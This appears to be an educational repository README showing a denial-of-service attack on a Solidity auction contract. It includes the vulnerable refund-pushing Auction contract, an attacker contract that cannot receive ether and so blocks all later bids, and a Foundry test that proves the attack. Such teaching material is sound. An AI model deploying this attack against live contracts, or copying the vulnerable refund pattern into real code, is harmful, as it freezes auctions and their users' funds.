# DoS Attack Targeting an Auction Smart Contract

Denial of Service (DoS), also known as a DoS attack, renders smart contracts permanently or temporarily inaccessible to legitimate users.

## Installation 🛠️

1. Clone the repository:
```shell
git clone https://github.com/ionOM/smart-contract-attacks.git
```

2. Move to the auction folder:
```shell
cd smart-contract-attacks/denial-of-service/auction
```
3. When you are in the auction folder, type in the console:
```shell
forge test
```

## How this attack work

To illustrate how an unexpected revert can lead to a Denial-of-Service (DoS), let's examine the functionality of an Auction smart contract. In this contract, bidders can place bids, and upon the emergence of a new highest bidder, the contract initiates a refund to the previous bidder.

#### Auction.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract Auction {
    address public lastBidder;
    uint256 public highestBid;

    function bid() public payable {
        require(msg.value > highestBid, "invalid amount");
        (bool sent, ) = payable(lastBidder).call{value: highestBid}("");
        require(sent, "Failed to send Ether");

       lastBidder = msg.sender;
       highestBid = msg.value;
    }
}
```


The Attacker contract retrieves the deployed address of the Auction contract and initializes it in the constructor, enabling the attacker to access the functions within the Auction contract. The attack() function subsequently invokes the bid() function of the Auction contract to place a bid.


#### AttackAuction.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./Auction.sol";

contract AttackAuction {
    Auction auction;

    constructor(Auction _auctionaddr) {
        auction = Auction(_auctionaddr);
    }

    function attack() public payable {
        auction.bid{value: msg.value}();
    }
}
```

#### How did the exploit take place? Let's break it down step by step.
Imagine users commencing the bidding process

1. User1 makes a bid for 1 ether and thus will be the lastBidder.
2. User2 makes a bid for 2 ether thus will take over the role of lastBidder and user1 is refunded back.
3. The attacker calls the contract attack() function and makes a bid with 3 ether. The attacker contract will be the new lastBidder and user2 is refunded back.
4. Now, if any other user makes a call to bid() function, the refund to the attacker contract will fail. This is because the Attacker contract has not implemented the receive() or fallback function to receive ether. Due to this any Solidity ether transfer function such as call(), send() or transfer() will result in an exception or unexpected revert due to the require() statement, stopping the execution.

So, no one else will be able to place a bid after the attacker makes their offer using the AttackAuction contract.
#### You can refer to the test that I created for testing
#### AuctionAttackTest.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {Auction} from "src/Auction.sol";
import {AttackAuction} from "src/AttackAuction.sol";

contract AuctionAttackTest is Test {
    Auction auction;
    AttackAuction attackContract;

    address deployAuction = makeAddr("deployAuction");
    address attacker = makeAddr("attacker");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");

    function setUp() public {
        vm.prank(deployAuction);
        auction = new Auction();
        vm.prank(attacker);
        attackContract = new AttackAuction(auction);
    }

    function test_attack_auction_dos() public  {
        // user1 makes a bid for 1 ether and thus will be the lastBidder.
        uint256 user1Bid = 1 ether;
        hoax(user1, 2 ether);
        auction.bid{value: user1Bid}();
        assertEq(user1Bid, auction.highestBid());

        // user2 makes a bid for 2 ether thus will take over the role of lastBidder
        // and user1 is refunded back.
        uint256 user2Bid = 2 ether;
        hoax(user2, 10 ether);
        auction.bid{value: user2Bid}();
        assertEq(user2Bid, auction.highestBid());

        // the attacker calls the contract attack() function and makes a bid with 3 ether
        // The attacker contract will be the new lastBidder and user2 is refunded back.
        uint256 attackerBid = 3 ether;
        hoax(attacker, 10 ether);
        attackContract.attack{value: attackerBid}();
        assertEq(attackerBid, auction.highestBid());

        /*Now, if any other user makes a call to bid() function, the refund to the
        attacker contract will fail. This is because the Attacker contract has not
        implemented the receive() or fallback function to receive ether. Due to this
        any Solidity ether transfer function such as call(), send() or transfer() will
        result in an exception or unexpected revert due to the require() statement,
        stopping the execution.
        */
        uint256 user3Bid = 4 ether;
        hoax(user3, 10 ether);
        vm.expectRevert(bytes("Failed to send Ether"));
        auction.bid{value: user3Bid}();
        assertEq(attackerBid, auction.highestBid());
    }

}
```
